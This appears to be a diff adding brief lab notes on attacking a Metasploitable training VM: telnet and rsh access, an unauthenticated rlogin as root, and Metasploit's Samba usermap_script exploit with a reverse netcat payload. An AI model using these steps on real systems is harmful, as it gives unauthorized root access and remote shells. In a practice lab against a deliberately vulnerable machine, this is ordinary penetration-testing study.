@@ -1,0 +1,32 @@
+Hacking Web Server:
+
+Information gathering:
+>Try default password
+>services mis-configured,such as Ports 512,513,514
+>code execution vulnerability
+
+Practical 1:
+>telnet (Metasploitable IP)
+>export TERM=xterm
+
+2.
+512 netkit-rsh rexecd:
+>apt-get install rsh-client
+>rlogin --help
+>rlogin -l root <Metasploitable ip>
+ (got logined into machine)
+>id
+>pwd
+
+3.
+139 samba:
+>use exploit/multi/samba/usermap_script (13)
+>set rhost
+>show payload
+>set payload cmd/unix/reverse_netcat
+>show options
+>set lhost
+>exploit
+
+
+
